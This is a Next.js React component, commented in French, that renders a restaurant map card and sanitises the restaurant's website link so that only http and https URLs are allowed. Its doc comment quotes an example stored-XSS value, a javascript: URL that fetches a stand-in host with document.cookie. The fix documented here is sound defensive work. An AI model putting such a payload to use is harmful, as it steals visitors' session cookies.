import Image from "next/image";
import mapImg from "@/public/assets/images/map.png";

const SITE_PAR_DEFAUT = "http://thaliaeats.com";

/**
 * Le site web d'un restaurant, tel qu'il est saisi dans le back-office.
 *
 * Il partait directement dans `href` : une fiche portant
 * `javascript:fetch('https://ailleurs/?c='+document.cookie)` faisait executer
 * ce script dans le navigateur de chaque visiteur de la page du restaurant, au
 * clic. On ne garde donc que `http` et `https`, et l'adresse par defaut sert de
 * repli pour tout le reste.
 *
 * Une valeur sans schema (« thaliaeats.com », la saisie la plus courante) est
 * prefixee plutot que rejetee : sans cela le navigateur la lirait comme un
 * chemin relatif de notre propre site.
 */
const lienSur = (adresse) => {
  const valeur = typeof adresse === "string" ? adresse.trim() : "";

  if (!valeur) return SITE_PAR_DEFAUT;
  if (/^https?:\/\//i.test(valeur)) return valeur;
  // Un schema autre que http(s) est refuse net, jamais prefixe.
  if (/^[a-z][a-z0-9+.-]*:/i.test(valeur)) return SITE_PAR_DEFAUT;

  return `https://${valeur}`;
};

export default function Map({ data, infoResto }) {
  const site = data?.data?.website || infoResto?.website;

  return (
    <section className="rounded-xl box-shadow-custom overflow-hidden w-full h-[500px] relative bg-red-700">
      <Image src={mapImg} className="h-full w-full object-cover" alt="map" />
      <div data-aos="fade-right" className="absolute w-[95%] md:w-[300px] rounded-xl left-3 bottom-5 md:left-10 md:bottom-10 bg-secondaryColor/95 py-10 px-5">
        <div className="mb-5">
          <h3 className="text-white text-xl font-semibold">{data?.data?.name || infoResto?.name}</h3>
          <h4 className="text-primaryColor text-sm"> {data?.data?.adresse || infoResto?.adresse}</h4>
        </div>
        <p className="text-sm leading-5 text-gray-200 font-light mb-4 sm:w-[70%] w-full md:w-full">
          {data?.data?.reference || infoResto?.reference}
        </p>
        <div>
          <p className="text-white text-sm">Site Web</p>
          <p className="text-primaryColor text-sm font-light">
            <a href={lienSur(site)} target="_blank" rel="noopener noreferrer"> {site || "Thaliaeats.com"}</a>
          </p>
        </div>
      </div>
    </section>
  );
}
